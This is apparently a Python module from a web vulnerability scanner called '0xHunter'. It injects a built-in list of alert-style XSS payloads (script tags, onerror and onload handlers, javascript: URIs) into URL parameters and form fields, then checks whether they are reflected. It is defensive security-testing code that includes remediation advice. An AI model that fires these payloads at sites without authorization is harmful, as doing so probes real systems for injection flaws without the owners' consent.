"""
XSS (Cross-Site Scripting) Detection Module
Tests for reflected and stored XSS vulnerabilities
"""

import asyncio
import re
from urllib.parse import urlparse, parse_qsl, urlencode
from typing import List, Dict, Optional
from dataclasses import dataclass

import httpx
from bs4 import BeautifulSoup

from core.rate_limiter import RateLimiter
from core.paths import PAYLOADS_DIR
from utils.logger import setup_logger


@dataclass
class XSSFinding:
    """Represents a confirmed or potential XSS vulnerability"""
    url: str
    parameter: str
    payload: str
    type: str  # 'reflected', 'stored', 'dom'
    confidence: str  # 'low', 'medium', 'high'
    evidence: str
    remediation: str
    severity: str = "high"  # BUG-005 FIX: explicit severity


class XSSScanner:
    """
    XSS Detection Module
    Tests URL parameters and form inputs for XSS vulnerabilities.
    """
    
    def __init__(self, rate_limiter: RateLimiter, payload_file: str = None):
        self.rate_limiter = rate_limiter
        self.logger = setup_logger("XSS")
        resolved = str(PAYLOADS_DIR / "xss/xss.txt") if payload_file is None else payload_file
        self.payloads = self._load_payloads(resolved)
        self.findings: List[XSSFinding] = []
        
        # HTTP client
        self.client: Optional[httpx.AsyncClient] = None
        self.timeout = httpx.Timeout(8.0, connect=5.0)
    
    def _load_payloads(self, filepath: str) -> List[str]:
        """Load XSS payloads from file"""
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            self.logger.info(f"Loaded {len(payloads)} XSS payloads")
            return payloads
        except FileNotFoundError:
            self.logger.warning(f"Payload file not found: {filepath}. Using defaults.")
            return self._default_payloads()
    
    def _default_payloads(self) -> List[str]:
        """Default XSS payloads if file not found"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<a href=javascript:alert('XSS')>click</a>",
            '<img src="x" onerror="alert(\'XSS\')">',
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<svg><script>alert('XSS')</script></svg>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
        ]
    
    async def _fetch(self, url: str, method: str = "GET", data: Optional[Dict] = None) -> Optional[httpx.Response]:
        """Make HTTP request with rate limiting"""
        try:
            async def _do_request():
                if method.upper() == "POST" and data:
                    return await self.client.post(url, data=data, follow_redirects=True)
                return await self.client.get(url, follow_redirects=True)
            
            return await self.rate_limiter.execute_with_retry(_do_request)
        except Exception as e:
            self.logger.warning(f"Request failed {url}: {e}")
            return None
    
    def _check_reflection(self, response_text: str, payload: str) -> bool:
        """
        Check if payload is reflected in response.
        Returns True if reflected (potential XSS).
        """
        # Simple reflection check
        if payload in response_text:
            return True
        
        # Check for encoded versions
        from html import escape
        if escape(payload) in response_text:
            return True
        
        return False
    
    def _analyze_context(self, response_text: str, payload: str) -> str:
        """
        Analyze where payload appears in response to determine confidence.
        """
        soup = BeautifulSoup(response_text, 'html.parser')
        
        # Check if in script tag
        scripts = soup.find_all('script')
        for script in scripts:
            if payload in str(script):
                return "high"  # In script context = very dangerous
        
        # Check if in HTML attribute
        pattern = "<[^>]*=[\"'][^\"']*" + re.escape(payload)
        if re.search(pattern, response_text):
            return "high"
        
        # Check if in HTML body
        if payload in response_text:
            return "medium"
        
        return "low"
    
    async def test_url_parameter(self, url: str, param: str, payload: str) -> Optional[XSSFinding]:
        """Test a single URL parameter with a payload"""
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        
        if param not in params:
            return None
        
        # Create test URL with payload
        test_params = params.copy()
        test_params[param] = payload
        test_query = urlencode(test_params)
        test_url = parsed._replace(query=test_query).geturl()
        
        response = await self._fetch(test_url)
        if not response:
            return None
        
        if self._check_reflection(response.text, payload):
            confidence = self._analyze_context(response.text, payload)
            
            return XSSFinding(
                url=url,
                parameter=param,
                payload=payload,
                type="reflected",
                confidence=confidence,
                evidence=f"Payload reflected in response (confidence: {confidence})",
                remediation="Use context-appropriate encoding (HTML encode, JS encode). Implement Content Security Policy (CSP). Use frameworks that auto-escape output."
            )
        
        return None
    
    async def test_form(self, form_action: str, form_method: str, 
                        inputs: List[Dict], payload: str) -> Optional[XSSFinding]:
        """Test a form with XSS payload"""
        # Prepare form data
        data = {}
        target_input = None
        
        for inp in inputs:
            if inp.get('name'):
                if inp.get('type') in ['text', 'search', 'url', 'email', '']:
                    data[inp['name']] = payload
                    target_input = inp['name']
                else:
                    data[inp['name']] = inp.get('value', 'test')
        
        if not target_input:
            return None
        
        method = form_method.upper()
        if method == "POST":
            response = await self._fetch(form_action, method="POST", data=data)
        else:
            # GET request with query params
            test_url = f"{form_action}?{urlencode(data)}"
            response = await self._fetch(test_url)
        
        if not response:
            return None
        
        if self._check_reflection(response.text, payload):
            confidence = self._analyze_context(response.text, payload)
            
            return XSSFinding(
                url=form_action,
                parameter=target_input,
                payload=payload,
                type="reflected",
                confidence=confidence,
                evidence=f"Form payload reflected in response (confidence: {confidence})",
                remediation="Validate and sanitize all user input. Use output encoding. Implement CSP headers."
            )
        
        return None
    
    async def scan(self, target_urls: List[str], forms: List) -> List[XSSFinding]:
        """
        Main scan method.
        target_urls: List of URLs with parameters
        forms: List of Form objects from crawler
        """
        self.logger.info(f"Starting XSS scan on {len(target_urls)} URLs and {len(forms)} forms")
        
        headers = {
            'User-Agent': '0xHunter Security Scanner (Authorized Testing)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }
        
        async with httpx.AsyncClient(
            headers=headers,
            timeout=self.timeout,
            follow_redirects=True,
            verify=False
        ) as client:
            self.client = client
            
            tasks = []
            
            # Test URL parameters
            for url in target_urls:
                parsed = urlparse(url)
                params = dict(parse_qsl(parsed.query))
                for param in params.keys():
                    for payload in self.payloads[:5]:  # Test first 5 payloads per param (speed)
                        tasks.append(self.test_url_parameter(url, param, payload))
            
            # Test forms
            for form in forms:
                for payload in self.payloads[:3]:  # Test first 3 payloads per form
                    tasks.append(self.test_form(
                        form.action, form.method, form.inputs, payload
                    ))
            
            # Run all tests
            self.logger.info(f"Running {len(tasks)} XSS tests...")
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, Exception):
                    self.logger.error(f"XSS test error: {result}")
                    continue
                if result:
                    self.findings.append(result)
                    self.logger.warning(f"XSS Found: {result.url} | Param: {result.parameter} | Confidence: {result.confidence}")
        
        self.logger.info(f"XSS scan complete. Found {len(self.findings)} potential issues")
        return self.findings